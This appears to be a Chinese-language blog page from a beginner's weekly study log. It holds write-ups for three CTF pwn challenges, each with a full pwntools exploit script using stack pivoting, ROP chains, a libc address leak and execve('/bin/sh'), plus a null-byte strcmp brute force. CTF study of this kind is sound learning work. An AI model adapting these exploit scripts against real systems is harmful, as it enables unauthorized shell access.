@@ -1,0 +1,807 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bug.png">
+  <link rel="icon" href="/img/bug.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#1F3144">
+  <meta name="author" content="ZLSF">
+  <meta name="keywords" content="ZLSF,zlsf">
+  
+    <meta name="description" content="本周学习总结 所有人都看过来，看我看我，我宣布的事，我是个———————–。 栈迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移。 全局常量声明：新手上路，文章内容仅是由教程观点和自己总结获得，仅供参考。 一、虽然我承认阁下的system很强，但是如果我拿出execve，阁下又该如何应对 你是否有过system死都打不通的情况，每次都为这玩意苦恼，明明都最后一步了，愣是打不通是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="23-12-04">
+<meta property="og:url" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/index.html">
+<meta property="og:site_name" content="ZLSF的博客">
+<meta property="og:description" content="本周学习总结 所有人都看过来，看我看我，我宣布的事，我是个———————–。 栈迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移。 全局常量声明：新手上路，文章内容仅是由教程观点和自己总结获得，仅供参考。 一、虽然我承认阁下的system很强，但是如果我拿出execve，阁下又该如何应对 你是否有过system死都打不通的情况，每次都为这玩意苦恼，明明都最后一步了，愣是打不通是">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image1.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image2.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image3.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image4.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image5.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image6.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image7.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image8.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image9.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image10.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image11.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image12.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image13.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image14.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image15.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image16.png">
+<meta property="article:published_time" content="2023-12-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-13T16:19:54.819Z">
+<meta property="article:author" content="ZLSF">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zlsf-zl.github.io/2023/12/04/12-04-12-10/image1.png">
+  
+  
+  
+  <title>23-12-04 - ZLSF的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zlsf-zl.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"6qfbMdW9PFOPATbmhAiyPWcK-MdYXbMMI","app_key":"X9xyyWbc7hafcwTqYXwdhjE5","server_url":"https://6qfbmdw9.api.lncldglobal.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>ZLSF的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/start.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="23-12-04"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-04 00:00" pubdate>
+          2023年12月4日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">23-12-04</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>本周学习总结</p>
+<p>所有人都看过来，看我看我，我宣布的事，我是个———————–。</p>
+<p>栈迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移迁移。</p>
+<p>全局常量声明：新手上路，文章内容仅是由教程观点和自己总结获得，仅供参考。</p>
+<p>一、虽然我承认阁下的system很强，但是如果我拿出execve，阁下又该如何应对</p>
+<p>你是否有过system死都打不通的情况，每次都为这玩意苦恼，明明都最后一步了，愣是打不通是吧。但是现在有了新的福音。不是system用不起，而是execve更有性价比。</p>
+<p>execve一共有三个参数，如果我们只是想获取&#x2F;bin&#x2F;sh，那么只需要将第一个参数设置为”&#x2F;bin&#x2F;sh”的地址，其他两个参数全部设置为0足以。</p>
+<p>可能平常这玩意没什么用，但是如果system死都打不通的话，不如再试试execve吧。</p>
+<p>缺点：要求苛刻，需要设置三个寄存器，程序中可能没有需要的寄存器！</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xyqer/articles/16757374.html">https://www.cnblogs.com/xyqer/articles/16757374.html</a></p>
+<p>二、Easy–baby_stack–热身题</p>
+<p>需要前置技能：简单栈迁移。</p>
+<p>下载得到文件baby_stack</p>
+<p>Check</p>
+<p><img src="/2023/12/04/12-04-12-10/image1.png" srcset="/img/loading.gif" lazyload></p>
+<p>64位，开启NX。</p>
+<p>ida，启动！</p>
+<p><img src="/2023/12/04/12-04-12-10/image2.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现主要逻辑函数vuln。</p>
+<p>第一次输入向bss段写入0x100字节</p>
+<p><img src="/2023/12/04/12-04-12-10/image3.png" srcset="/img/loading.gif" lazyload></p>
+<p>第二次输入仅仅溢出0x10，需要使用栈迁移。</p>
+<p><img src="/2023/12/04/12-04-12-10/image4.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现后门函数但是没有”&#x2F;bin&#x2F;sh”。</p>
+<p><img src="/2023/12/04/12-04-12-10/image5.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现”&#x2F;bin&#x2F;sh”。</p>
+<p>通过第一次输入向bss段写入ROP链以获得system，第二次输入将基地址迁移到bss段，使用leave ret；特性执行ROP链。</p>
+<p>编写脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;docker.nh0pe.top&quot;</span>, <span class="hljs-number">33568</span>)<br><br>pop_rdi = <span class="hljs-number">0x4012e3</span><br>sys_addr = <span class="hljs-number">0x4011A5</span><br>bin_addr = <span class="hljs-number">0x404048</span><br>bss_addr = <span class="hljs-number">0x404CA0</span><br>leave_ret = <span class="hljs-number">0x401248</span><br><span class="hljs-comment"># pop_rdi和leave_ret通过ROPgadget得到</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">8</span> + p64(pop_rdi) + p64(bin_addr) + p64(sys_addr)<br><span class="hljs-comment"># 因为leave ret；需要先pop rbp；，所以这里有8字节的垃圾数据</span><br><br>p.send(payload)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + p64(bss_addr) + p64(leave_ret)<br><span class="hljs-comment"># 两次leave ret；完成栈迁移。（程序本身有一次leave ret；）</span><br><br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/04/12-04-12-10/image6.png" srcset="/img/loading.gif" lazyload></p>
+<p>flag到手。</p>
+<p>三、Easy–password–年轻人的第一次爆破</p>
+<p>需要前置技能：python函数定义</p>
+<p>下载得到文件password</p>
+<p>check一下</p>
+<p><img src="/2023/12/04/12-04-12-10/image7.png" srcset="/img/loading.gif" lazyload></p>
+<p>64位程序，开启NX。</p>
+<p>ida，启动！</p>
+<p><img src="/2023/12/04/12-04-12-10/image8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/12/04/12-04-12-10/image9.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现主要逻辑。</p>
+<p>程序的意思是通过读取linux自带的真随机生成器获取一个64字节的密码，第一次输入存在溢出，使得我们可以跳转到system地址，但是前提是我们要在第二次输入时猜对这个64字节的密码。</p>
+<p>strcmp是C语言的比较函数，如果两个字符串相同返回0，但是字符串是以’\0’结尾的，有没有一种可能由密码的第一个字节就被随机成”\0”。而我们输入时也只输入”\0”，strcmp一比较，断然相等，密码验证就被绕开了。</p>
+<p>我们可以采用爆破，也就是反复启动程序来随机密码的第一个字节，理论是成功的概率是1&#x2F;256（char的范围）。</p>
+<p><img src="/2023/12/04/12-04-12-10/image10.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现system(“&#x2F;bin&#x2F;sh”)。（终于见到了一个完整的）</p>
+<p>构造脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sys_addr = <span class="hljs-number">0x4012F3</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&quot;./password&quot;</span>)<br><br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">40</span> + p64(sys_addr)<br><br>    p.sendafter(<span class="hljs-string">b&quot;please enter user name:\n&quot;</span>, payload)<br><br>    p.sendlineafter(<span class="hljs-string">b&quot;please enter password:\n&quot;</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Wrong password!\n&#x27;</span> <span class="hljs-keyword">in</span> p.recvline():<br>        p.close()<br>        <span class="hljs-keyword">return</span><br><br>    p.interactive()<br><br><br>exit(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># 一个小小的exit(0)就可以不至于让你的循环无法停止！</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    exp()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/04/12-04-12-10/image11.png" srcset="/img/loading.gif" lazyload></p>
+<p>获得”&#x2F;bin&#x2F;sh”。</p>
+<p>四、Medium–babystack–新人杀手</p>
+<p>需要前置技能：栈迁移+retlibc3</p>
+<p>下载得到文件pwn</p>
+<p>Check</p>
+<p><img src="/2023/12/04/12-04-12-10/image12.png" srcset="/img/loading.gif" lazyload></p>
+<p>ida，启动！</p>
+<p><img src="/2023/12/04/12-04-12-10/image13.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/12/04/12-04-12-10/image14.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现主要逻辑。</p>
+<p>如果我没有看错的话，输入溢出只有0x10，而且只有一次输入，没有system和”&#x2F;bin&#x2F;sh”。</p>
+<p>好好好，这么出题是吧。</p>
+<p>栈迁移是必要的l目标地址就选在无人区bss段吧。通过反复回到fun函数来完成多次输入。</p>
+<p><img src="/2023/12/04/12-04-12-10/image15.png" srcset="/img/loading.gif" lazyload></p>
+<p>fun的地址我们选取0x4011E3，主要是为了防止前面两条汇编指令影响栈的位置。</p>
+<p>主要思路是通过获得一个合适的bss段地址，先用程序本身的leave ret；将rbp送过去，然后执行fun在bss段输入，汇编中的输入执行和rbp有关，此时rsp的位置不重要。</p>
+<p>我们在第二次输入时写入可以暴露真实函数地址的ROP链来获得libc的基地址，同时也为下次栈迁移和调用fun函数做准备。</p>
+<p>我们在第三次输入就可以用通过libc基地址获得的”&#x2F;bin&#x2F;sh”和execve来得到shell了（system因为未知原因在这个程序中无法使用）</p>
+<p>构造脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>fun_addr = <span class="hljs-number">0x4011E3</span><br>bss_addr = <span class="hljs-number">0x404500</span><br>pop_rdi = <span class="hljs-number">0x4012b3</span><br>pop_rsi_lib = <span class="hljs-number">0x29419</span><br>pop_rdx_lib = <span class="hljs-number">0xfd6bd</span><br><span class="hljs-comment"># 如果程序中没有你需要的寄存器可以去libc中碰碰运气</span><br><br>bkk_addr = bss_addr - <span class="hljs-number">0x50</span><br>bcc_addr = bkk_addr - <span class="hljs-number">0x150</span><br>bdd_addr = bcc_addr - <span class="hljs-number">0x50</span><br><span class="hljs-comment"># 随便迁移一下</span><br><br>leave_ret = <span class="hljs-number">0x401227</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;me:\n&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x50</span> + p64(bss_addr) + p64(fun_addr)<br><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;me:\n&quot;</span>)<br><br>payload = p64(bcc_addr) + p64(pop_rdi) + p64(elf.got[<span class="hljs-string">&quot;read&quot;</span>]) + p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]) + p64(fun_addr) + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">40</span> + p64(bkk_addr) + p64(leave_ret)<br><span class="hljs-comment"># 暴露read真实地址</span><br><br>p.send(payload)<br><br>p.recvline()<br><br>read_real = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;read_real:&quot;</span> + <span class="hljs-built_in">hex</span>(read_real))<br><br>libc_base = read_real - <span class="hljs-number">0x0f7a50</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base:&quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment"># 获得libc基地址</span><br><br>bin_addr = libc_base + <span class="hljs-number">0x19604f</span><br>execve_addr = libc_base + <span class="hljs-number">0xd4060</span><br><span class="hljs-comment"># 通过网站查询得到，我的libc版本是2.37</span><br><br>pop_rsi = libc_base + pop_rsi_lib<br>pop_rdx = libc_base + pop_rdx_lib<br><span class="hljs-comment"># 调用libc里的寄存器</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;me:\n&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">8</span> + p64(pop_rdi) + p64(bin_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(execve_addr) + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">16</span> + p64(bdd_addr) + p64(leave_ret)<br><span class="hljs-comment"># 利用execve函数获得shell，system因为未知原因打不通</span><br><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;so funny\n&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/04/12-04-12-10/image16.png" srcset="/img/loading.gif" lazyload></p>
+<p>获得系统权限。</p>
+<p>下周学习计划</p>
+<p>| 应该要做的事情 |</p>
+<p>准备迎接考核赛</p>
+<p>准备期末考试</p>
+<p>学习感受</p>
+<p>南无&#x2F;bin&#x2F;sh</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/PWN/" class="print-no-link">#PWN</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>23-12-04</div>
+      <div>https://zlsf-zl.github.io/2023/12/04/12-04-12-10/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ZLSF</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/11/12-11-12-17/" title="23-12-11">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">23-12-11</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/27/11-27-12-03/" title="23-11-27">
+                        <span class="hidden-mobile">23-11-27</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"6qfbMdW9PFOPATbmhAiyPWcK-MdYXbMMI","appKey":"X9xyyWbc7hafcwTqYXwdhjE5","path":"window.location.pathname","placeholder":"文明发言","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://6qfbmdw9.api.lncldglobal.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      <span>by ZLSF</span>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
